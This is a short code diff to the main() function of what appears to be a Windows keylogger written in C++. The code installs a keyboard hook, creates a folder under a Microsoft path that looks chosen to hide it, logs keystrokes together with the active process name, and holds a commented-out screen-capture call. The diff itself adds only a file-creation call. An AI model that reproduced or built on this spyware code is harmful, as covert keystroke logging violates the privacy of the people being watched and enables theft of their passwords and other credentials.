@@ -19,11 +19,13 @@ int main() {
   key_hook::InstallHook();
 
   stream::MakeDir(stream::GetPath("\\Microsoft\\blxr"));
+  stream::MakeFile();
   stream::WriteLog("[*] BOOT [*]", key_hook::active_process, true);
 
   //screen::CaptureScreen(stream::GetPath("\\Microsoft\\blxr", true), "screen.jpeg");
 
   key_hook::HandleMessage(true);
 #endif
+
   return 0;
 }
